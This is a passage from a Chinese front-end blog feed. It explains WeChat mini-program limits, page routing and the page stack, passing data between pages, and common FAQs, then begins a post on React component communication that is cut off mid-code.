id="4-2-数量限制"><a href="#4-2-数量限制" class="headerlink" title="4.2 数量限制"></a>4.2 数量限制</h3><ul><li>底部或顶部可以添加<code>tab</code>按钮区域 <code>tabBar</code> 是一个数组，只能配置最少2个、最多5个 <code>tab</code>，<code>tab</code>按数组的顺序排序。</li><li>一个应用同时只能打开5个页面</li><li>小程序的<code>wx.request</code>请求最开始最大并发数是5个，后来，估计随着用小程序的越来越多，总之，就是增加到了10个</li></ul><h3 id="4-3-大小限制"><a href="#4-3-大小限制" class="headerlink" title="4.3 大小限制"></a>4.3 大小限制</h3><ul><li><code>tabBar</code> 上面的按钮 <code>iconPath</code> 图片路径，<code>icon</code>大小限制为<code>40kb</code></li><li><code>tabBar</code> 上面的按钮 <code>selectedIconPath</code>选中时的图片路径，<code>icon</code> 大小限制为<code>40kb</code></li><li><code>setData</code> 页面传递数据单次设置的数据不能超过<code>1024kB</code></li><li><code>setStorage</code> 本地缓存最大为<code>10MB</code></li><li>小程序源码打包后的大小限制为<code>1M</code></li></ul><h2 id="五、路由"><a href="#五、路由" class="headerlink" title="五、路由"></a>五、路由</h2><ul><li>微信路由接口有三个，分别是<code>wx.redirectTo</code>、<code>wx.navigateTo</code>和<code>wx.switchTab</code><br><code>wx.navigateTo</code>全局最多调用5次</li><li>如果某页面设置为<code>tab</code>页，则只支持<code>wx.switchTab</code>，不支持其他两种路由方式访问</li></ul><h3 id="5-1-哪些情况会触发页面跳转"><a href="#5-1-哪些情况会触发页面跳转" class="headerlink" title="5.1 哪些情况会触发页面跳转"></a>5.1 哪些情况会触发页面跳转</h3><ul><li>小程序启动，初始化第一个页面</li><li>打开新页面，调用 API <code>wx.navigateTo</code> 或使用<code>&lt;navigator /&gt;</code>组件</li><li>页面重定向，调用 API <code>wx.redirectTo</code> 或使用<code>&lt;navigator /&gt;</code>组件</li><li>页面返回，调用 API <code>wx.navigateBack</code>或用户按左上角返回按钮</li><li><code>tarbar</code>切换</li></ul><h3 id="5-2-如何跳转页面"><a href="#5-2-如何跳转页面" class="headerlink" title="5.2 如何跳转页面"></a>5.2 如何跳转页面</h3><ul><li>使用<code>wx.navigateTo</code>接口跳转,原页面保留</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wx.navigateTo(&#123;</span><br><span class="line">  <span class="comment">//目的页面地址</span></span><br><span class="line">  url: <span class="string">'pages/logs/index'</span>,</span><br><span class="line">  success: <span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;&#125;,</span><br><span class="line">  ...</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ul><li>使用<code>wx.redirectTo</code>接口跳转，关闭原页面,不能返回</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wx.redirectTo(&#123;</span><br><span class="line">  <span class="comment">//目的页面地址</span></span><br><span class="line">  url: <span class="string">'pages/logs/index'</span>,</span><br><span class="line">  success: <span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;&#125;,</span><br><span class="line">  ...</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="5-3-使用组件"><a href="#5-3-使用组件" class="headerlink" title="5.3 使用组件"></a>5.3 使用组件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;navigator url=&quot;pages/logs/index&quot; hover-class=&quot;navigator-hover&quot;&gt;跳转&lt;/navigator&gt;</span><br></pre></td></tr></table></figure><blockquote><p>当该组件添加<code>redirect</code>属性时，等同于<code>wx.redirectTo</code>接口；默认<code>redirect</code>属性为<code>false</code>，等同于<code>wx.navigateTo</code>接口</p></blockquote><p>用户点击左上角返回按钮，或调用<code>wx.navigateBack</code>接口返回上一页</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wx.navigateBack(&#123;</span><br><span class="line">    delta: <span class="number">1</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><blockquote><p><code>delta</code>为1时表示返回上一页，为2时表示上上一页，以此类推；如果dalta大于已打开的页面总数，则返回到首页。返回后，元界面会销毁</p></blockquote><h3 id="5-4-页面跳转传值"><a href="#5-4-页面跳转传值" class="headerlink" title="5.4 页面跳转传值"></a>5.4 页面跳转传值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?key=value&amp;key1=value1</span><br></pre></td></tr></table></figure><blockquote><p>传递的参数没有被<code>URIEncode</code>,传递中文没有乱码</p></blockquote><h3 id="5-5-如何正确使用页面跳转"><a href="#5-5-如何正确使用页面跳转" class="headerlink" title="5.5 如何正确使用页面跳转"></a>5.5 如何正确使用页面跳转</h3><blockquote><p>官方规定小程序最多只能有五个页面同时存在，意思是在不关闭页面的情况，最多新开五个页面，页面深度为5</p></blockquote><ul><li>对于可逆操作，使用<code>wx.navigateTo</code>,比如从首页跳转到二级页面，从二级页面返回是不需要重新渲染首页</li><li>对于不可逆操作，使用<code>wx.redirectTo</code>,比如用户登录成功后，关闭登录页面，不能返回到登录界面。</li><li>对于一些介绍性等不常用页面<code>wx.redirectTo</code>或<code>wx.navigatrBack</code></li><li>不要在首页使用<code>wx.redirectTo</code>，这样会导致应用无法返回首页</li></ul><h3 id="5-6-页面栈"><a href="#5-6-页面栈" class="headerlink" title="5.6 页面栈"></a>5.6 页面栈</h3><ul><li>页面栈以栈（先进后出）的形式维护页面与页面之间的关系</li><li>小程序提供了<code>getCurrentPages()</code>函数获取页面栈，第一个元素为首页，最后一个元素为当前页面</li></ul><p><strong>使用wx.navigateTo每新开一个页面，页面栈大小加1,直到页面栈大小为5为止</strong></p><p><img src="https://upload-images.jianshu.io/upload_images/1480597-6cf7cccb6c5213fd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><strong>使用wx.navigateTo重复打开界面</strong></p><p><img src="https://upload-images.jianshu.io/upload_images/1480597-c1236072261f0108.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><blockquote><p>假如使用wx.navigateTo从四级页面跳转到二级页面，此时会在页面栈顶添加一个与二级页面初始状态一样的界面，但两个页面状态是独立的。页面栈大小会加1，如果页面栈大小为5，则wx.navigateTo无效</p></blockquote><p><strong>使用wx.redirectTo重定向</strong></p><p><img src="https://upload-images.jianshu.io/upload_images/1480597-5db240ac56b7d403.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><blockquote><p>假如使用wx.redirectTo从四级页面重定向到二级页面，此时会将关闭四级页面，并使用二级页面替换四级页面，但两个页面状态是独立的。此时的页面栈大小不变，请注意和使用wx.navigateTo的区别</p></blockquote><p><strong>使用wx.navigateBack返回</strong></p><p><img src="https://upload-images.jianshu.io/upload_images/1480597-4ec22f18f2e38491.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><strong>总结</strong></p><ul><li><code>wx.navigateTo</code>会增加页面栈大小，直到页面栈大小为5</li><li><code>wx.redirectTo</code>不会增加页面栈大小</li><li><code>wx.navigateBack</code>会减少页面栈大小，直到页面栈大小为1</li></ul><h2 id="六、数据通信"><a href="#六、数据通信" class="headerlink" title="六、数据通信"></a>六、数据通信</h2><h3 id="6-1-页面之间的通信"><a href="#6-1-页面之间的通信" class="headerlink" title="6.1 页面之间的通信"></a>6.1 页面之间的通信</h3><ul><li>使用全局变量 <code>app.globalData</code></li><li>使用本地缓存 <code>wx.setStorageSync</code></li><li><code>url</code>传递**</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// A页面-传递数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 需要注意的是，wx.switchTab 中的 url 不能传参数。</span></span><br><span class="line">wx.navigateTo(&#123;</span><br><span class="line">   url:<span class="string">'../pageD/pageD?name=raymond&amp;gender=male'</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// B页面-接收数据//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//通过onLoad的option...</span></span><br><span class="line"></span><br><span class="line">Page(&#123;</span><br><span class="line">onLoad: <span class="function"><span class="keyword">function</span>(<span class="params">option</span>)</span>&#123;</span><br><span class="line"> <span class="built_in">console</span>.log(option.name +<span class="string">'is'</span>+ option.gender)<span class="comment">// raymond is male</span></span><br><span class="line">  <span class="keyword">this</span>.setData(&#123;<span class="attr">option</span>: option &#125;)</span><br><span class="line">&#125;&#125;)</span><br></pre></td></tr></table></figure><h3 id="6-2-参数传递"><a href="#6-2-参数传递" class="headerlink" title="6.2 参数传递"></a>6.2 参数传递</h3><h4 id="6-2-1-小程序传递参数的方式"><a href="#6-2-1-小程序传递参数的方式" class="headerlink" title="6.2.1 小程序传递参数的方式"></a>6.2.1 小程序传递参数的方式</h4><p><strong>1、通过在<code>App.js</code>中设置全局变量</strong></p><blockquote><p>通常把不会更改的数据放在<code>app.js</code>的<code>Data</code>中，在各个页面中都可以通过<code>APP</code>实例获取<code>Data</code>数据</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> app = getApp();</span><br><span class="line"><span class="keyword">var</span> data = app.data;</span><br></pre></td></tr></table></figure><p><strong>2、通过拼接<code>URL</code>直接传递</strong></p><blockquote><p><code>wx.navigateTo({})</code>中<code>URL</code>携带参数</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wx.navigateTo(&#123;</span><br><span class="line">  url: &apos;test?id=1&apos;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><strong>在wxml中使用<code>navigator</code>跳转url传递参数</strong></p><blockquote><p>代码如下，将要传递到另一个页面的字符串testId的值赋值到url中</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;navigator class=&quot;test-item&quot; url=&quot;../../pages/test/test?testId=&#123;&#123;testData.testId&#125;&#125;&quot;&gt;&lt;/navigator&gt;</span><br></pre></td></tr></table></figure><blockquote><p>在<code>js</code>页面中<code>onLoad</code>方法中接收</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Page(&#123;</span><br><span class="line">  onLoad: <span class="function"><span class="keyword">function</span>(<span class="params">options</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> testId = options.testId</span><br><span class="line">      <span class="built_in">console</span>.log(testId)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><strong><code>navigator</code>跳转<code>url</code>传递数组</strong></p><blockquote><p>如果一个页面要将一个数组，如相册列表传递到另一个页面</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;navigator class=&quot;test-item&quot; url=&quot;../../pages/test/test?albumList=&#123;&#123;testData.albumList&#125;&#125;&quot;&gt;&lt;/navigator&gt;</span><br></pre></td></tr></table></figure><blockquote><p>传递到js后从<code>options</code>中得到的是个字符串，每个图片的url通过’,’分隔，所以此时还需要对其进行处理，重新组装为数组</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Page(&#123;</span><br><span class="line">    data: &#123;</span><br><span class="line">         <span class="comment">// 相册列表数据</span></span><br><span class="line">        albumList: [],</span><br><span class="line">    &#125;,    </span><br><span class="line">    onLoad: <span class="function"><span class="keyword">function</span> (<span class="params">options</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> that = <span class="keyword">this</span>;</span><br><span class="line"></span><br><span class="line">        that.setData(&#123;</span><br><span class="line">            albumList: options.albumList.split(<span class="string">","</span>)</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><strong>3、在wxml中绑定事件后，通过<code>data-hi=&quot;参数&quot;</code>的方式传递</strong></p><blockquote><p>这种方式一般是在wxml中绑定事件，同时设置需要传递的数据，如果需要传递多个，可以写多个<code>data-[参数]</code>的方式进行传递</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;view bindtap=&quot;clickMe&quot; data-testId=&#123;&#123;testId&#125;&#125;&quot;&gt;</span><br><span class="line">    ...</span><br><span class="line">&lt;/view&gt;</span><br></pre></td></tr></table></figure><blockquote><p>在js页面中自定义方法clickMe中接收</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Page(&#123;</span><br><span class="line">    clickMe: <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> testId = event.currentTarget.dataset.testid;</span><br><span class="line">        wx.navigateTo(&#123;</span><br><span class="line">            url: <span class="string">'../../pages/test/test'</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><strong>wxml中配置data-albumlist传递数组</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;view bindtap=&quot;clickMe&quot; data-albumlist=&#123;&#123;testData.albumList&#125;&#125;&quot;&gt;</span><br><span class="line">    </span><br><span class="line">&lt;/view&gt;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">在js页面中自定义方法clickMe中接收</span><br><span class="line"></span><br><span class="line">Page(&#123;</span><br><span class="line">    clickMe: <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> albumList = event.currentTarget.dataset.albumlist.split(<span class="string">","</span>);</span><br><span class="line">        wx.navigateTo(&#123;</span><br><span class="line">            url: <span class="string">'../../pages/test/test'</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><strong>4、通过数据缓存存储再获取</strong></p><blockquote><p><code>wx.setStorageSync(KEY,DATA)</code>存储数据</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">  wx.setStorageSync(&apos;key&apos;, &apos;value&apos;)</span><br><span class="line">&#125; catch (e) &#123;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>wx.getStorageSync(KEY)</code>获取数据</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> value = wx.getStorageSync(<span class="string">'key'</span>)</span><br><span class="line">  <span class="keyword">if</span> (value) &#123;</span><br><span class="line">    <span class="comment">// Do something with return value</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">   <span class="comment">// Do something when catch error</span></span><br><span class="line">&#125;</span><br><span class="line">或</span><br><span class="line">wx.getStorage(&#123;</span><br><span class="line">  key: <span class="string">'key'</span>,</span><br><span class="line">  success: <span class="function"><span class="keyword">function</span>(<span class="params">res</span>) </span>&#123;</span><br><span class="line">     <span class="built_in">console</span>.log(res.data)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="七、疑问汇总"><a href="#七、疑问汇总" class="headerlink" title="七、疑问汇总"></a>七、疑问汇总</h2><p><strong>为什么脚本内不能使用window等对象</strong></p><ul><li>页面的脚本逻辑是在<code>JsCore</code>中运行，JsCore是一个没有窗口对象的环境，所以不能在脚本中使用<code>window</code>，也无法在脚本中操作组件</li></ul><p><strong>为什么 zepto/jquery 无法使用</strong></p><ul><li><code>zepto/jquery</code> 会使用到<code>window</code>对象和<code>document</code>对象，所以无法使用</li></ul><p><strong>wx.navigateTo无法打开页面</strong></p><ul><li>一个应用同时只能打开5个页面，当已经打开了5个页面之后，<code>wx.navigateTo</code>不能正常打开新页面。请避免多层级的交互方式，或者使用<code>wx.redirectTo</code></li></ul><p><strong>样式表不支持级联选择器</strong></p><ul><li><code>WXSS</code>支持以<code>.</code>开始的类选择器</li></ul><p><strong>本地资源无法通过 css 获取</strong></p><ul><li><code>background-image</code>：可以使用网络图片，或者 <code>base64</code>，或者使用<code>&lt;image/&gt;</code>标签</li></ul><p><strong>如何修改窗口的背景色</strong></p><ul><li>使用 page 标签选择器，可以修改顶层节点的样式</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">page</span> &#123; </span><br><span class="line">  <span class="attribute">display</span>: block; </span><br><span class="line">  <span class="attribute">min-height</span>: <span class="number">100%</span>; </span><br><span class="line">  <span class="attribute">background-color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>为什么上传不成功</strong></p><ul><li>为了提升体验流畅度，编译后的代码包大小需小于 1MB ，大于 1MB 的代码包将上传失败</li></ul><p><strong>HTTPS 请求不成功</strong></p><ul><li>tls 仅支持 1.2 及以上版本</li></ul><p><strong>微信小程序支持fetch或者promise吗?</strong></p><ul><li><code>promise</code>工具目前不支持，<code>fetch</code> 客户端不支持 工具下个版本保持统一</li></ul><p><strong>wx.request的POST方法的参数传输服务器接收不到的bug</strong></p><ul><li><code>wx.request post</code> 的 <code>content-type</code> 默认为 <code>‘application/json &#39;</code></li><li>如果服务器没有用到 <code>json</code> 解释的话，可以把 <code>content-type</code> 设置回 <code>urlencoded</code></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wx.request(&#123;</span><br><span class="line">....</span><br><span class="line">method: <span class="string">"POST"</span>,</span><br><span class="line">header: &#123;</span><br><span class="line"><span class="string">"content-type"</span>: <span class="string">"application/x-www-form-urlencoded"</span></span><br><span class="line">&#125;,</span><br><span class="line">...</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><strong>wx.uploadFile在手机上返回http码403</strong></p><ul><li>安卓的微信升级到6.5.2及其以上版本</li></ul><p><strong>小程序SVG支持吗?</strong></p><ul><li><code>image</code>的src放远程svg可以，<code>background-image</code>里也可以</li></ul><p><strong>ipad不能使用小程序？</strong></p><ul><li>暂时不支持ipad打开小程序</li></ul><p><strong>请问小程序页内支持长按保存图片或分享图片吗？</strong></p><ul><li>目前没有这个功能</li></ul><p><strong>微信小程序不支持cookie</strong></p><ul><li>使用<code>Reids</code>存储<code>session</code></li></ul><p><strong>有些手机不支持Object.assign方法，如果使用了该方法会出现莫名其妙的报错（并不会提示Object.assign is not function，而是导致调用了Object.assign方法的方法不能被调用）！</strong></p><blockquote><p>直接写一个合并对象的方法</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">assignObject</span>(<span class="params">o, n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> p <span class="keyword">in</span> n) &#123;</span><br><span class="line">        <span class="keyword">if</span> (n.hasOwnProperty(p) &amp;&amp; (!o.hasOwnProperty(p)))</span><br><span class="line">            o[p] = n[p];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="八、小程序组件"><a href="#八、小程序组件" class="headerlink" title="八、小程序组件"></a>八、小程序组件</h2><p> <img src="https://upload-images.jianshu.io/upload_images/1480597-62a5f00053f5f0d1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、小程序代码组成&quot;&gt;&lt;a href=&quot;#一、小程序代码组成&quot; class=&quot;headerlink&quot; title=&quot;一、小程序代码组成&quot;&gt;&lt;/a&gt;一、小程序代码组成&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://upload-images.jianshu.io
      
    
    </summary>
    
      <category term="Front-End" scheme="http://blog.poetries.top/categories/Front-End/"/>
    
    
      <category term="小程序" scheme="http://blog.poetries.top/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/"/>
    
  </entry>
  
  <entry>
    <title>React之组件通信方式</title>
    <link href="http://blog.poetries.top/2018/07/29/react-comp-communicate/"/>
    <id>http://blog.poetries.top/2018/07/29/react-comp-communicate/</id>
    <published>2018-07-29T15:20:24.000Z</published>
    <updated>2018-08-23T01:41:37.487Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://upload-images.jianshu.io/upload_images/1480597-e9f0c8c8e859eed9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="组件通信"></p><blockquote><p>组件之进行通信的几种情况</p></blockquote><ul><li>父组件向子组件通信</li><li>子组件向父组件通信</li><li>跨级组件通信</li><li>没有嵌套关系组件之间的通信</li></ul><h2 id="一、父组件向子组件通信"><a href="#一、父组件向子组件通信" class="headerlink" title="一、父组件向子组件通信"></a>一、父组件向子组件通信</h2><blockquote><p><code>React</code>数据流动是单向的,父组件向子组件通信也是最常见的;父组件通过<code>props</code>向子组件传递需要的信息</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Child.jsx</span></span><br><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> PropTypes <span class="keyword">from</span> <span class="string">'prop-types'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">Child</span>(<span class="params">&#123; name &#125;</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, &#123;name&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Child.propTypes = &#123;</span><br><span class="line">    name: PropTypes.string.isRequired,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Parent.jsx</span></span><br><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Child <span class="keyword">from</span> <span class="string">'./Child'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parent</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">    render() &#123;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            &lt;div&gt;</span><br><span class="line">                &lt;Child name=<span class="string">"Sara"</span> /&gt;</span><br><span class="line">            &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        );</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">export default Parent;</span></span><br></pre></td></tr></table></figure><h2 id="二、子组件向父组件通信"><a href="#二、子组件向父组件通信" class="headerlink" title="二、子组件向父组件通信"></a>二、子组件向父组件通信</h2><ul><li>利用回调函数</li><li>利用自定义事件机制</li></ul><blockquote><p>实现在子组件中点击隐藏组件按钮可以将自身隐藏的功能</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> PropTypes <span class="keyword">from</span> <span class="string">'prop-types'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">List3</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> propTypes = &#123;</span><br><span class="line">        hideConponent: PropTypes.func.isRequired,</span><br><span class="line">    &#125;</span><br><span class="line">    render() &#123;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            &lt;div&gt;</span><br><span class="line">                哈哈,我是List3</span><br><span class="line">                &lt;button onClick=&#123;<span class="keyword">this</span>.props.hideConponent&#125;&gt;隐藏List3组件&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">            &lt;/</span>div&gt;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> List3;</span><br><span class="line"></span><br><span class="line"><span class="comment">//app.jsx</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> List3 <span class="keyword">from</span> <span class="string">'./components/List3'</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(...args) &#123;</span><br><span class="line">        <span 